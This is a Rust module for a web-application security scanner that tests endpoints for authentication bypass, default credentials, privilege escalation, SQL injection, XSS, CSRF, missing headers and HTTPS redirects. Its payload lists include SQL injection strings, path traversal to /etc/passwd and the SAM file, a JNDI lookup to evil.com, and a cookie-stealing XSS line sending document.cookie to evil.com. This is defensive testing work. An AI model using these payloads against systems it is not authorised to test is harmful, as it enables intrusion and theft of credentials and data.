use crate::http_client::{HttpTester, TestRequest, TestResponse};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use std::str::FromStr;
use uuid::Uuid;
use anyhow::Result;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityTestConfig {
    pub base_url: String,
    pub test_authentication: bool,
    pub test_authorization: bool,
    pub test_input_validation: bool,
    pub test_sql_injection: bool,
    pub test_xss: bool,
    pub test_csrf: bool,
    pub test_security_headers: bool,
    pub test_ssl_tls: bool,
    pub auth_token: Option<String>,
    pub test_endpoints: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SecurityTestResults {
    pub total_tests: usize,
    pub passed_tests: usize,
    pub failed_tests: usize,
    pub vulnerabilities: Vec<Vulnerability>,
    pub security_score: f64,
    pub recommendations: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Vulnerability {
    pub severity: VulnerabilitySeverity,
    pub category: VulnerabilityCategory,
    pub description: String,
    pub endpoint: String,
    pub payload: String,
    pub response_code: u16,
    pub evidence: String,
    pub remediation: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum VulnerabilitySeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum VulnerabilityCategory {
    Authentication,
    Authorization,
    InputValidation,
    SqlInjection,
    XSS,
    CSRF,
    SecurityHeaders,
    SSL,
    InformationDisclosure,
}

pub struct SecurityTester {
    http_tester: HttpTester,
    config: SecurityTestConfig,
}

impl SecurityTester {
    pub fn new(config: SecurityTestConfig) -> Self {
        let http_tester = HttpTester::new(&config.base_url);
        Self {
            http_tester,
            config,
        }
    }

    pub async fn run_security_tests(&self) -> SecurityTestResults {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        if self.config.test_authentication {
            let auth_results = self.test_authentication().await;
            vulnerabilities.extend(auth_results.0);
            total_tests += auth_results.1;
            passed_tests += auth_results.2;
        }

        if self.config.test_authorization {
            let authz_results = self.test_authorization().await;
            vulnerabilities.extend(authz_results.0);
            total_tests += authz_results.1;
            passed_tests += authz_results.2;
        }

        if self.config.test_input_validation {
            let input_results = self.test_input_validation().await;
            vulnerabilities.extend(input_results.0);
            total_tests += input_results.1;
            passed_tests += input_results.2;
        }

        if self.config.test_sql_injection {
            let sql_results = self.test_sql_injection().await;
            vulnerabilities.extend(sql_results.0);
            total_tests += sql_results.1;
            passed_tests += sql_results.2;
        }

        if self.config.test_xss {
            let xss_results = self.test_xss().await;
            vulnerabilities.extend(xss_results.0);
            total_tests += xss_results.1;
            passed_tests += xss_results.2;
        }

        if self.config.test_csrf {
            let csrf_results = self.test_csrf().await;
            vulnerabilities.extend(csrf_results.0);
            total_tests += csrf_results.1;
            passed_tests += csrf_results.2;
        }

        if self.config.test_security_headers {
            let headers_results = self.test_security_headers().await;
            vulnerabilities.extend(headers_results.0);
            total_tests += headers_results.1;
            passed_tests += headers_results.2;
        }

        if self.config.test_ssl_tls {
            let ssl_results = self.test_ssl_tls().await;
            vulnerabilities.extend(ssl_results.0);
            total_tests += ssl_results.1;
            passed_tests += ssl_results.2;
        }

        let failed_tests = total_tests - passed_tests;
        let security_score = if total_tests > 0 {
            (passed_tests as f64 / total_tests as f64) * 100.0
        } else {
            0.0
        };

        let recommendations = self.generate_recommendations(&vulnerabilities);

        SecurityTestResults {
            total_tests,
            passed_tests,
            failed_tests,
            vulnerabilities,
            security_score,
            recommendations,
        }
    }

    async fn test_authentication(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        // Test 1: Access protected endpoint without authentication
        for endpoint in &self.config.test_endpoints {
            total_tests += 1;
            let request = TestRequest {
                method: "GET".to_string(),
                path: endpoint.clone(),
                headers: HashMap::new(),
                body: None,
                expected_status: 401,
                expected_response_time_ms: None,
            };

            match self.http_tester.execute_test(&request).await {
                Ok(response) => {
                    if response.status == 200 {
                        vulnerabilities.push(Vulnerability {
                            severity: VulnerabilitySeverity::High,
                            category: VulnerabilityCategory::Authentication,
                            description: "Endpoint accessible without authentication".to_string(),
                            endpoint: endpoint.clone(),
                            payload: "No authentication headers".to_string(),
                            response_code: response.status,
                            evidence: format!("Received status {}, expected 401", response.status),
                            remediation: "Implement proper authentication checks".to_string(),
                        });
                    } else {
                        passed_tests += 1;
                    }
                }
                Err(_) => {
                    // Connection errors are not authentication failures
                    passed_tests += 1;
                }
            }
        }

        // Test 2: Weak authentication bypass attempts
        for endpoint in &self.config.test_endpoints {
            let bypass_attempts = vec![
                ("admin", "admin"),
                ("admin", "password"),
                ("root", "root"),
                ("test", "test"),
                ("user", "user"),
            ];

            for (username, password) in bypass_attempts {
                total_tests += 1;
                use base64::prelude::*;
                let auth_header = format!("Basic {}", 
                    BASE64_STANDARD.encode(format!("{}:{}", username, password)));
                
                let mut headers = HashMap::new();
                headers.insert("Authorization".to_string(), auth_header);

                let request = TestRequest {
                    method: "GET".to_string(),
                    path: endpoint.clone(),
                    headers,
                    body: None,
                    expected_status: 401,
                    expected_response_time_ms: None,
                };

                match self.http_tester.execute_test(&request).await {
                    Ok(response) => {
                        if response.status == 200 {
                            vulnerabilities.push(Vulnerability {
                                severity: VulnerabilitySeverity::Critical,
                                category: VulnerabilityCategory::Authentication,
                                description: "Weak default credentials accepted".to_string(),
                                endpoint: endpoint.clone(),
                                payload: format!("{}:{}", username, password),
                                response_code: response.status,
                                evidence: format!("Login successful with weak credentials"),
                                remediation: "Remove default credentials and enforce strong password policy".to_string(),
                            });
                        } else {
                            passed_tests += 1;
                        }
                    }
                    Err(_) => passed_tests += 1,
                }
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_authorization(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        // Test privilege escalation
        for endpoint in &self.config.test_endpoints {
            // Test with different user roles
            let role_tests = vec![
                ("user", "user-token"),
                ("guest", "guest-token"),
                ("readonly", "readonly-token"),
            ];

            for (role, token) in role_tests {
                total_tests += 1;
                let mut headers = HashMap::new();
                headers.insert("Authorization".to_string(), format!("Bearer {}", token));

                let request = TestRequest {
                    method: "DELETE".to_string(), // Assuming DELETE requires admin
                    path: endpoint.clone(),
                    headers,
                    body: None,
                    expected_status: 403,
                    expected_response_time_ms: None,
                };

                match self.http_tester.execute_test(&request).await {
                    Ok(response) => {
                        if response.status == 200 {
                            vulnerabilities.push(Vulnerability {
                                severity: VulnerabilitySeverity::High,
                                category: VulnerabilityCategory::Authorization,
                                description: "Privilege escalation possible".to_string(),
                                endpoint: endpoint.clone(),
                                payload: format!("Role: {}", role),
                                response_code: response.status,
                                evidence: format!("Lower privilege user can perform admin actions"),
                                remediation: "Implement proper role-based access control".to_string(),
                            });
                        } else {
                            passed_tests += 1;
                        }
                    }
                    Err(_) => passed_tests += 1,
                }
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_input_validation(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        let malicious_inputs = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "../../windows/system32/config/sam",
            "%00",
            "\\x00\\x01\\x02",
        ];

        for endpoint in &self.config.test_endpoints {
            for input in &malicious_inputs {
                total_tests += 1;
                let request = TestRequest {
                    method: "POST".to_string(),
                    path: endpoint.clone(),
                    headers: HashMap::new(),
                    body: Some(format!("{{\"input\": \"{}\"}}", input)),
                    expected_status: 400,
                    expected_response_time_ms: None,
                };

                match self.http_tester.execute_test(&request).await {
                    Ok(response) => {
                        if response.status == 200 && response.body.contains(input) {
                            vulnerabilities.push(Vulnerability {
                                severity: VulnerabilitySeverity::Medium,
                                category: VulnerabilityCategory::InputValidation,
                                description: "Input validation bypass detected".to_string(),
                                endpoint: endpoint.clone(),
                                payload: input.to_string(),
                                response_code: response.status,
                                evidence: format!("Malicious input reflected in response"),
                                remediation: "Implement proper input validation and sanitization".to_string(),
                            });
                        } else {
                            passed_tests += 1;
                        }
                    }
                    Err(_) => passed_tests += 1,
                }
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_sql_injection(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        let sql_payloads = vec![
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "1; SELECT * FROM information_schema.tables",
        ];

        for endpoint in &self.config.test_endpoints {
            for payload in &sql_payloads {
                total_tests += 1;
                let request = TestRequest {
                    method: "POST".to_string(),
                    path: endpoint.clone(),
                    headers: HashMap::new(),
                    body: Some(format!("{{\"id\": \"{}\"}}", payload)),
                    expected_status: 400,
                    expected_response_time_ms: None,
                };

                match self.http_tester.execute_test(&request).await {
                    Ok(response) => {
                        let sql_error_indicators = vec![
                            "mysql_fetch_array",
                            "ORA-00921",
                            "Microsoft OLE DB Provider",
                            "SQLServer JDBC Driver",
                            "PostgreSQL query failed",
                            "sqlite3.OperationalError",
                        ];

                        if sql_error_indicators.iter().any(|&indicator| response.body.contains(indicator)) {
                            vulnerabilities.push(Vulnerability {
                                severity: VulnerabilitySeverity::Critical,
                                category: VulnerabilityCategory::SqlInjection,
                                description: "SQL injection vulnerability detected".to_string(),
                                endpoint: endpoint.clone(),
                                payload: payload.to_string(),
                                response_code: response.status,
                                evidence: format!("SQL error message in response: {}", response.body),
                                remediation: "Use parameterized queries and input validation".to_string(),
                            });
                        } else {
                            passed_tests += 1;
                        }
                    }
                    Err(_) => passed_tests += 1,
                }
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_xss(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        let xss_payloads = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
        ];

        for endpoint in &self.config.test_endpoints {
            for (i, payload) in xss_payloads.iter().enumerate() {
                total_tests += 1;
                println!("Testing XSS #{}: {} on endpoint {}", i + 1, payload, endpoint);
                let request = TestRequest {
                    method: "POST".to_string(),
                    path: endpoint.clone(),
                    headers: HashMap::new(),
                    body: Some(format!("{{\"message\": \"{}\"}}", payload)),
                    expected_status: 200,
                    expected_response_time_ms: None,
                };

                match self.http_tester.execute_test(&request).await {
                    Ok(response) => {
                        if response.body.contains(payload) && !response.body.contains("&lt;script&gt;") {
                            vulnerabilities.push(Vulnerability {
                                severity: VulnerabilitySeverity::High,
                                category: VulnerabilityCategory::XSS,
                                description: "Cross-site scripting (XSS) vulnerability detected".to_string(),
                                endpoint: endpoint.clone(),
                                payload: payload.to_string(),
                                response_code: response.status,
                                evidence: format!("XSS payload reflected unescaped in response"),
                                remediation: "Implement proper output encoding and content security policy".to_string(),
                            });
                        } else {
                            passed_tests += 1;
                        }
                    }
                    Err(_) => passed_tests += 1,
                }
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_csrf(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        for endpoint in &self.config.test_endpoints {
            total_tests += 1;
            println!("Testing CSRF #1: State-changing request without CSRF token on endpoint {}", endpoint);
            println!("  Testing: POST request with delete action (no CSRF token)");
            let request = TestRequest {
                method: "POST".to_string(),
                path: endpoint.clone(),
                headers: HashMap::new(),
                body: Some("{\"action\": \"delete\"}".to_string()),
                expected_status: 403,
                expected_response_time_ms: None,
            };

            match self.http_tester.execute_test(&request).await {
                Ok(response) => {
                    println!("  Response: HTTP {} (Expected: 403 Forbidden)", response.status);
                    if response.status == 200 {
                        vulnerabilities.push(Vulnerability {
                            severity: VulnerabilitySeverity::Medium,
                            category: VulnerabilityCategory::CSRF,
                            description: "Cross-site request forgery (CSRF) vulnerability detected".to_string(),
                            endpoint: endpoint.clone(),
                            payload: "POST request without CSRF token".to_string(),
                            response_code: response.status,
                            evidence: format!("State-changing request accepted without CSRF protection"),
                            remediation: "Implement CSRF tokens for state-changing requests".to_string(),
                        });
                        println!("  Result: FAIL - CSRF vulnerability detected!");
                    } else {
                        passed_tests += 1;
                        println!("  Result: PASS - Request properly rejected");
                    }
                }
                Err(e) => {
                    println!("  Result: PASS - Request failed (good security): {}", e);
                    passed_tests += 1;
                },
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_security_headers(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        let required_headers = vec![
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy",
        ];

        for endpoint in &self.config.test_endpoints {
            total_tests += 1;
            println!("Testing Security Headers: Analyzing HTTP response headers on endpoint {}", endpoint);
            println!("  Checking for 6 critical security headers...");
            let request = TestRequest {
                method: "GET".to_string(),
                path: endpoint.clone(),
                headers: HashMap::new(),
                body: None,
                expected_status: 200,
                expected_response_time_ms: None,
            };

            match self.http_tester.execute_test(&request).await {
                Ok(response) => {
                    let mut missing_headers = Vec::new();
                    let mut present_headers = Vec::new();
                    
                    for header in &required_headers {
                        if !response.headers.contains_key(*header) {
                            missing_headers.push(header.to_string());
                        } else {
                            present_headers.push(header.to_string());
                        }
                    }

                    println!("  Present headers: {}", if present_headers.is_empty() { "None".to_string() } else { present_headers.join(", ") });
                    println!("  Missing headers: {}", if missing_headers.is_empty() { "None".to_string() } else { missing_headers.join(", ") });

                    if !missing_headers.is_empty() {
                        vulnerabilities.push(Vulnerability {
                            severity: VulnerabilitySeverity::Medium,
                            category: VulnerabilityCategory::SecurityHeaders,
                            description: "Missing security headers".to_string(),
                            endpoint: endpoint.clone(),
                            payload: "Header analysis".to_string(),
                            response_code: response.status,
                            evidence: format!("Missing headers: {}", missing_headers.join(", ")),
                            remediation: "Add missing security headers to all responses".to_string(),
                        });
                        println!("  Result: FAIL - Missing critical security headers");
                    } else {
                        passed_tests += 1;
                        println!("  Result: PASS - All security headers present");
                    }
                }
                Err(e) => {
                    println!("  Result: ERROR - Failed to analyze headers: {}", e);
                    passed_tests += 1;
                },
            }
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    async fn test_ssl_tls(&self) -> (Vec<Vulnerability>, usize, usize) {
        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut passed_tests = 0;

        if self.config.base_url.starts_with("https://") {
            total_tests += 1;
            
            // Test if HTTP is also accessible (should redirect to HTTPS)
            let http_url = self.config.base_url.replace("https://", "http://");
            println!("Testing SSL/TLS #1: HTTP to HTTPS redirect validation");
            println!("  Testing: {} -> should redirect to HTTPS", http_url);
            let http_tester = HttpTester::new(&http_url);
            
            let request = TestRequest {
                method: "GET".to_string(),
                path: "/".to_string(),
                headers: HashMap::new(),
                body: None,
                expected_status: 301,
                expected_response_time_ms: None,
            };

            match http_tester.execute_test(&request).await {
                Ok(response) => {
                    println!("  Response: HTTP {} (Expected: 301/302 redirect)", response.status);
                    if response.status == 200 {
                        vulnerabilities.push(Vulnerability {
                            severity: VulnerabilitySeverity::Medium,
                            category: VulnerabilityCategory::SSL,
                            description: "HTTP endpoint accessible without redirect to HTTPS".to_string(),
                            endpoint: "/".to_string(),
                            payload: "HTTP request".to_string(),
                            response_code: response.status,
                            evidence: format!("HTTP version accessible without redirect"),
                            remediation: "Redirect all HTTP traffic to HTTPS".to_string(),
                        });
                    } else {
                        passed_tests += 1;
                        println!("  Result: PASS - Proper redirect detected");
                    }
                }
                Err(e) => {
                    println!("  Result: PASS - HTTP connection failed (good security): {}", e);
                    passed_tests += 1;
                },
            }
        } else {
            println!("Testing SSL/TLS: Skipped - URL is not HTTPS");
        }

        (vulnerabilities, total_tests, passed_tests)
    }

    fn generate_recommendations(&self, vulnerabilities: &[Vulnerability]) -> Vec<String> {
        let mut recommendations = Vec::new();
        
        let critical_count = vulnerabilities.iter().filter(|v| matches!(v.severity, VulnerabilitySeverity::Critical)).count();
        let high_count = vulnerabilities.iter().filter(|v| matches!(v.severity, VulnerabilitySeverity::High)).count();
        
        if critical_count > 0 {
            recommendations.push("URGENT: Address all critical vulnerabilities immediately".to_string());
        }
        
        if high_count > 0 {
            recommendations.push("High priority: Fix high-severity vulnerabilities within 24 hours".to_string());
        }
        
        recommendations.push("Implement a Web Application Firewall (WAF)".to_string());
        recommendations.push("Regular security testing and code reviews".to_string());
        recommendations.push("Keep all dependencies up to date".to_string());
        recommendations.push("Implement security headers on all responses".to_string());
        recommendations.push("Use HTTPS for all communications".to_string());
        
        recommendations
    }
}

// Additional utility functions for security testing
pub fn generate_test_payloads(category: &str) -> Vec<String> {
    match category {
        "xss" => vec![
            "<script>alert('XSS')</script>".to_string(),
            "<img src=x onerror=alert('XSS')>".to_string(),
            "<svg onload=alert('XSS')>".to_string(),
        ],
        "sql" => vec![
            "' OR '1'='1".to_string(),
            "'; DROP TABLE users; --".to_string(),
            "' UNION SELECT * FROM users --".to_string(),
        ],
        "path_traversal" => vec![
            "../../../etc/passwd".to_string(),
            "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
            "....//....//....//etc/passwd".to_string(),
        ],
        _ => vec![],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let xss_payloads = generate_test_payloads("xss");
        assert!(!xss_payloads.is_empty());
        assert!(xss_payloads.iter().any(|p| p.contains("script")));
        
        let sql_payloads = generate_test_payloads("sql");
        assert!(!sql_payloads.is_empty());
        assert!(sql_payloads.iter().any(|p| p.contains("DROP TABLE")));
    }

    #[test]
    fn test_vulnerability_creation() {
        let vuln = Vulnerability {
            severity: VulnerabilitySeverity::High,
            category: VulnerabilityCategory::XSS,
            description: "Test vulnerability".to_string(),
            endpoint: "/test".to_string(),
            payload: "<script>alert('test')</script>".to_string(),
            response_code: 200,
            evidence: "Script tag in response".to_string(),
            remediation: "Escape output".to_string(),
        };
        
        assert!(matches!(vuln.severity, VulnerabilitySeverity::High));
        assert!(matches!(vuln.category, VulnerabilityCategory::XSS));
    }
}